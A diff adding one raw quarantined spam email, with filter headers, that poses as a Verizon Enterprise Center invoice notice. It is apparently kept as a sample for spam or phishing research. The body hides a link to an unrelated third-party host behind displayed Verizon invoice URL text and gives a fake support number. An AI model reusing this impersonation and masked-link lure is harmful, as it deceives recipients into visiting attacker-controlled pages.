@@ -1,0 +1,59 @@
+Return-Path: <warranty.ptk@globe-trucking.com>
+Delivered-To: spam-quarantine
+X-Envelope-To: <mnc25@njit.edu>
+X-Envelope-To-Blocked: <mnc25@njit.edu>
+X-Quarantine-ID: <agAU6K-WyKo8>
+X-Spam-Flag: YES
+X-Spam-Score: 8.255
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.255 tag=2 tag2=6.31 kill=6.31
+	tests=[ALL_TRUSTED=-1, DIGEST_MULTIPLE=0.001,
+	HTML_IMAGE_ONLY_12=1.629, HTML_MESSAGE=0.001, MIME_HTML_ONLY=1.105,
+	PYZOR_CHECK=1.985, RAZOR2_CF_RANGE_51_100=0.365,
+	RAZOR2_CF_RANGE_E8_51_100=2.43, RAZOR2_CHECK=1.729,
+	T_REMOTE_IMAGE=0.01] autolearn=no
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id agAU6K-WyKo8 for <mnc25@njit.edu>;
+	Tue,  5 Feb 2019 20:47:00 +0530 (IST)
+Received: from [192.7.4.55] (unknown [41.213.3.234])
+	by mx10.jcbl.com (Postfix) with ESMTPSA id 59136F4BF53
+	for <mnc25@njit.edu>; Tue,  5 Feb 2019 20:46:59 +0530 (IST)
+Date: Tue, 05 Feb 2019 17:28:28 +0200
+From: Verizon Enterprise Center <warranty.ptk@globe-trucking.com>
+To: mnc25@njit.edu
+Message-Id: <vzcYWlri6fkCndLwrbRDHmFrT7kBb8Dw9ptSJ2KkzYlUAKfp8HK@njit.edu>
+Subject: Invoice eMail - 02-05-2019
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<body>
+<p><font face=3D"Arial">
+For the account(s) noted below, Verizon invoice(s) are now available to vie=
+w online via the Verizon Enterprise Center:<br>
+<br>	=20
+Master Acct. No.<br>=09
+2790555890022<br>
+<br>
+<a href=3D"http://prueba.medysalud.com/JavYa_L7O-DFbSHmt/dew/Clients_inform=
+ation/02_19">https://enterprisecenter.verizon.com/enterprisesolutions/globa=
+l/dlink/ncas/PdfBillView.doMAN=3D2790555890022&BAN=3D2790555890022&OSID=3D9=
+9&BILLDATE=3D2019-02-05</a><br>
+<br>
+<br>
+To view the invoice(s) click the Invoices link.<br>
+<br>=20
+Please do not reply to this e-mail message.<br>
+<br>
+Your Verizon Team<br>
+<img src=3D"http://ss7.vzw.com/is/image/VerizonWireless/vz-sig-verizon?$def=
+aultscale$"><br>
+<br>
+If you have received this notification in error, or if you need further ass=
+istance accessing your invoice, please contact Verizon Enterprise Center Su=
+pport at (800) 191-3195.<br>
+</font></p>
+</body>
+</html> 
